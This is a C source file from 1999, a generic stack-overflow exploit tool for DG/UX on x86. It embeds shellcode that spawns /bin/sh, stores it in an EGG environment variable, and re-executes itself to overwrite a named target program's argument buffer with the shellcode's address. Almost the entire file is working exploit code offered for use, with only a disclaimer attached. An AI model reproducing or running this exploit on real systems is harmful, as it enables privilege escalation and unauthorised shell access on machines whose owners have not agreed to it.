/******************************************************************************
 *		Stack Smasher by Luciano Rocha, (c) 1999                      *
 *		 for dgux (Data General's UN*X) on x86                        *
 *									      *
 *	To compile: cc -o squash-dgux-x86 squash-dgux-x86.c		      *
 *									      *
 *	To use: squash-dgux-x86 <length> <program to squash> [params of prog] *
 *			EGG [other params of prog]			      *
 *									      *
 *	For a list of programs and their respective lengths see my home page, *
 *		currently at http://strange.nsk.yi.org/                       *
 *									      *
 *	My email: strange@nsk.yi.org					      *
 *									      *
 *	Disclaimer: I take no responsability of whatever may result of using  *
 * 		this program nor I sugest ilegal use of it.		      *
 *			You are on your own.				      *
 ******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

char maker[] = "Generic stack-smasher for dgux-x86 by Luciano Rocha, (c) 1999.\n";

char sc[] = {
	'E', 'G', 'G', '=',
	0x33, 0xc0, 0x33, 0xc9, 0x80, 0xc1, 0x68, 0x66, 0x51, 0x66, 0x68, 0x2f,
	0x73, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x8b, 0xdc, 0x50, 0x53, 0x80, 0xc1,
	0xdf, 0x66, 0x51, 0x50, 0x66, 0xba, 0x90, 0x9a, 0x66, 0x52, 0x66, 0x68,
	0x33, 0xc0, 0x66, 0x51, 0x50, 0x66, 0x52, 0x66, 0x68, 0x90, 0x58, 0x66,
	0x51, 0x50, 0x66, 0x52, 0x8b, 0xcc, 0x8b, 0xd3, 0x81, 0xc2, 0xf8, 0xff,
	0xff, 0xff, 0x52, 0x52, 0x53, 0x50, 0x04, 0x11, 0x50, 0x51, 0x04, 0x25,
	0xc3, 0x00
};

int prepare2(int argc, char *argv[]) {
	int len, off;
	char *buff;
	
	if (argc < 4) {
		fprintf(stderr, "%s <size> <prog_to_smash> [args] EGG "
			"[args].\n", argv[0]);
		exit(1);
	}
	for (off = 1; off < argc && strcmp(argv[off], "EGG"); ++off);
	if (off >= argc) {
		fprintf(stderr, "%s: no EGG parameter specified. Aborting.\n",
				argv[0]);
		exit(1);
	}
	len = strtol(argv[1], NULL, 0);
	buff = (char *) malloc(len + 1);
	buff[len] = '\0';
	memset(buff, 0x90, len);
	putenv(sc);
	argv[off] = buff;
	execv(argv[0], argv+2);
	perror(argv[0]);
	return 1;
}

int dosquash(int argc, unsigned char *argv[]) {
	char *p;
	int pos, ptr;
	int *d;

	p = getenv("EGG");
	fprintf(stderr, "%s: EGG == %p, EGG[0] == 0x%x\n", argv[0], p, *p);
	pos = 1;
	while (argv[pos] && *argv[pos] != 0x90) ++pos;
	if (!argv[pos]) {
		fprintf(stderr, "%s: no place to squash...\n", argv[0]);
		exit(0);
	}
	d = (int *) argv[pos];
	ptr = (int) p;
	while (*d == 0x90909090) *d++ = ptr;
	execv(argv[0], argv);
	perror(argv[0]);
	return 1;
}

int main(int argc, char *argv[]) {

	if (getenv("EGG")) dosquash(argc, (unsigned char **)argv);
	else prepare2(argc, argv);
	return 1;
}
